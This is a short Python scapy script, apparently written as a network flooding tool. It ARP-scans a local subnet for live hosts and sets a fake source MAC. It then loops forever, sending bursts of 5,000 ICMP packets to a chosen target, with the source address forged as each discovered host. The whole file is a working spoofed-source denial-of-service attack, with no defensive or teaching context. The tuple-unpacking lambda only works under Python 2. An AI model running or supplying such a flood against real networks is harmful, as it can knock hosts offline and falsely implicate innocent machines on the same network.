import sys
from scapy.all import *
import os

subnet_addr = input("Enter subnet address (192.168.1.0/24) :- ")
dst_ip = input("Enter destination ip :- ")

ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet_addr),timeout=2)

ether_pkt = Ether()
ether_pkt.src = "00:00:01:02:05:05"
ether_pkt.display()

ip_addr = []
ans.summary(lambda(s,r): ip_addr.append(s.pdst))

while True:
	for ip in ip_addr:
		ip_pkt = IP()/ICMP()
		ip_pkt.dst = dst_ip
		ip_pkt.src = ip
		ip_pkt.display()

		sendp(ether_pkt/ip_pkt, count=5000)